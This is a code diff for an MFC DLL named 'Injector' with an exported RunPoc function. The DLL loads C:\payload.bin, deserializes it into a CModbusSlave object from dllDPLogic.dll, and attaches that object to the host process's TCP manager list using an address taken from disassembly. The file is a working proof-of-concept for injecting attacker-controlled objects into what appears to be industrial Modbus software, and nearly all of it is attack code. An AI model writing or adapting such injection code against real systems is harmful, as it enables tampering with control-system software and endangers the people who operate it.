@@ -1,44 +1,95 @@
 #include <afx.h>
 #include <afxwin.h>
-#include <vector>
 #include <afxtempl.h>
+#include <vector>
 
-typedef CRuntimeClass* (__stdcall* PGET_CLASS)();
+#define IDA_BASE 0x00400000
+#define TCP_MANAGER_IDA_ADDR 0x0084713C
 
 void ShowError(LPCTSTR msg) {
-    ::MessageBox(NULL, msg, _T("Injector"), MB_OK | MB_ICONERROR);
+    ::MessageBox(NULL, msg, _T("Injector Error"), MB_OK | MB_ICONERROR);
 }
 
 extern "C" __declspec(dllexport) void RunPoc()
 {
     AFX_MANAGE_STATE(AfxGetStaticModuleState());
 
-    void* pManagerRaw = *(void**)0x0084713C;
-    if (!pManagerRaw) {
-        ShowError(_T("Manager is NULL"));
+    CFile file;
+    if (!file.Open(_T("C:\\payload.bin"), CFile::modeRead | CFile::typeBinary)) {
+        ShowError(_T("Payload not found"));
+        return;
+    }
+    ULONGLONG size = file.GetLength();
+    std::vector<BYTE> buffer((size_t)size);
+    file.Read(buffer.data(), (UINT)size);
+    file.Close();
+
+    CMemFile memFile(buffer.data(), (UINT)size);
+    CArchive ar(&memFile, CArchive::load);
+
+    HMODULE hDll = GetModuleHandle(_T("dllDPLogic.dll"));
+    if (!hDll) {
+        ShowError(_T("dllDPLogic not loaded"));
         return;
     }
 
-    CObject* pManager = reinterpret_cast<CObject*>(pManagerRaw);
-    CString info;
-    info.Format(_T("Manager Addr: %p\n"), pManager);
+    typedef CRuntimeClass* (__stdcall* PGET_CLASS)();
+    FARPROC proc = GetProcAddress(hDll, "?GetThisClass@CModbusSlave@@SGPAUCRuntimeClass@@XZ");
+    if (!proc) {
+        ShowError(_T("Factory not found"));
+        return;
+    }
+
+    PGET_CLASS getClass = reinterpret_cast<PGET_CLASS>(proc);
+    CRuntimeClass* pClass = getClass();
+    CObject* pObj = pClass->CreateObject();
+
+    if (!pObj) {
+        ShowError(_T("CreateObject failed"));
+        return;
+    }
 
     try {
-        CRuntimeClass* pClass = pManager->GetRuntimeClass();
-        if (pClass && pClass->m_lpszClassName) {
-            info.AppendFormat(_T("Class Name: %S\n"), pClass->m_lpszClassName);
-        } else {
-            info.Append(_T("Class Name: <null>\n"));
-        }
-
-        if (pManager->IsKindOf(RUNTIME_CLASS(CObList))) {
-            info.Append(_T("✅ YES! It IS a CObList!\nWe can use standard AddTail."));
-        } else {
-            info.Append(_T("❌ NO. It is NOT a CObList.\nWe need to find its base class."));
-        }
-
-        ::MessageBox(NULL, info, _T("RTTI Analysis"), MB_OK);
-    } catch (...) {
-        ShowError(_T("Crash during RTTI check."));
+        pObj->Serialize(ar);
+    } catch (CException* e) {
+        e->Delete();
+        ShowError(_T("Serialize Failed"));
+        delete pObj;
+        return;
     }
+
+    DWORD_PTR baseAddr = (DWORD_PTR)GetModuleHandle(NULL);
+    DWORD_PTR offset = TCP_MANAGER_IDA_ADDR - IDA_BASE;
+    void** pManagerPtr = (void**)(baseAddr + offset);
+
+    if (IsBadReadPtr(pManagerPtr, 4)) {
+        CString msg;
+        msg.Format(_T("Calculated address is invalid!\nBase: %p, Offset: %X, Target: %p"),
+                   baseAddr, (unsigned int)offset, pManagerPtr);
+        ShowError(msg);
+        return;
+    }
+
+    CObject* pManager = (CObject*)(*pManagerPtr);
+    if (!pManager) {
+        ShowError(_T("Manager is NULL (Open a project first)"));
+        return;
+    }
+
+    try {
+        CObList* pList = (CObList*)pManager;
+        pList->AddTail(pObj);
+
+        ::MessageBox(NULL, _T("🎉 Success: Attached via standard MFC!"), _T("Done"), MB_OK);
+        pObj = nullptr;
+    }
+    catch (...) {
+        ShowError(_T("Crash during AddTail"));
+    }
+
+    if (pObj) {
+        delete pObj;
+    }
+    ar.Close();
+    memFile.Close();
 }
